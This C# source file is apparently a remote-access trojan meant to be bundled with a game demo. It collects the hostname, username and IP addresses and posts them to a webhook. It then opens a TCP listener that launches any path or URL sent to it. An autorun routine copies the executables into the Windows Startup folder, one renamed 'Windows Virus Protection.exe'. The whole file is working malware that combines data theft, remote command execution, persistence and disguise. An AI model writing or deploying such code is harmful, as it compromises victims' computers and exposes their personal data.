using System.Net;
using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text.Json;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;

class Program
{
    const string TOKEN = "TOKEN"; //Your Token
    static async Task Main(string[] args)
    {
        Thread thread = new Thread(Autorun);
        var rnd = new Random();
        List<string> list = new List<string>();
        list.Add($"--------------------------------------------------");
        list.Add(DateTime.Now.ToString("yyyy.MM.dd:HH.mm.ss:FFFFF"));
        list.Add("NEW DEVICE DETECTED! Collecting local data:");
        try
        {
            list.Add($"Hostname: {System.Net.Dns.GetHostName()}");
        }
        catch { }
        try
        {
            list.Add($"Devicename: {System.Environment.GetEnvironmentVariable("COMPUTERNAME")}");
        }catch { }
        try
        {
            list.Add($"Username: {System.Security.Principal.WindowsIdentity.GetCurrent().Name}");
        }
        catch { }
        try
        {
            string hostname = Dns.GetHostName();
            IPHostEntry IpAdress = Dns.GetHostEntry(hostname);
            IPHostEntry ipEntry = Dns.GetHostEntry(hostname);
            IPAddress[] addr = ipEntry.AddressList;
            for(int i = 0; i < addr.Length; i++)
            {
                list.Add($"IP Adress: {addr[i].ToString()}");
            }
        }
        catch { }
        int port = rnd.Next(30000, 49000);
        list.Add($"Port: {port}");
        list.Add("--------------------------------------------------");
        try
        {
            string webhookUrl = TOKEN;
            string nachricht;
            for(int i = 0; i < list.Count; i++)
            {
                nachricht = list[i].ToString();
                using (HttpClient client = new HttpClient())
                {
                    var payload = new
                    {
                        content = nachricht
                    };

                    var jsonPayload = JsonSerializer.Serialize(payload);
                    var stringContent = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                    var result = await client.PostAsync(webhookUrl, stringContent);
                }
            }
            
        }
        catch { }
        TcpListener listener = new TcpListener(port);
        listener.Start();
        byte[] bytes = new byte[1024];
        string data = null;
        while(true)
        {
            try
            {
                TcpClient client = listener.AcceptTcpClient();
                NetworkStream stream = client.GetStream();
                int i;
                while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                {
                    // Translate data bytes to a ASCII string.
                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);

                    byte[] msg = System.Text.Encoding.ASCII.GetBytes("Received");

                    // Send back a response.
                    stream.Write(msg, 0, msg.Length);
                    if (data.ToLower() == "shutdown")
                    {
                        //Process.Start("shutdown","/s /f /t 0");
                    }
                    string[] commands = data.Split(' ');
                    if (commands[0] == "http")
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = commands[1],
                            UseShellExecute = true
                        });
                    }
                }
            }catch { }
            
        }
    }
    static void Autorun()
    {
        try
        {
            string[] hostdata = System.Security.Principal.WindowsIdentity.GetCurrent().Name.Split('/');
            string username = hostdata[1];
            Debug.WriteLine(username);
            string autostart_path = Path.Combine("C:\\users", username, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
            if (Path.Exists(autostart_path))
            {
                File.Copy(Path.Combine(Directory.GetCurrentDirectory(), "background_analysis.exe"), Path.Combine(autostart_path, "background_analysis.exe"));
                Debug.WriteLine("1/2 Files copied!");
                File.Copy(Path.Combine(Directory.GetCurrentDirectory(), "GAME NAME Demo.exe"), Path.Combine(autostart_path, "Windows Virus Protection.exe"));
                Debug.WriteLine("2/2 Files copied!");
            }
            else
            {
                Debug.WriteLine("Path not found");
            }
        }catch { }
    }
}
